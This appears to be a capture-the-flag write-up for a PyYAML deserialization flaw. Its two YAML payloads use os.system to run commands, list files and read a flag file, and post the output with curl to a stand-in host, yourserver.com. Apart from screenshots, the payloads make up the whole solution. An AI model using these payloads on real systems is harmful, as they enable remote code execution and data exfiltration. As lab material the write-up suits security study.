### Vuln: Py-yaml Deserialization

Solve:

Use this yaml config :

```
!!python/object/apply:os.system
- "ls > /tmp/x && curl -X POST --data-binary @/tmp/x http://yourserver.com"
```

This will send the output os ls to our server:
![image](https://github.com/user-attachments/assets/ceb063c2-8325-4a39-b8ba-da57054a1a8f)

![image](https://github.com/user-attachments/assets/d365ab87-bfea-4237-95b0-8971ce7210c9)

Flag:
```
!!python/object/apply:os.system
- "cat /home/ctfuser/user.txt > /tmp/x && curl -X POST --data-binary @/tmp/x http://yourserver.com"
```

![image](https://github.com/user-attachments/assets/50fd8522-3847-4e59-9ea9-3537e5ea9bf2)
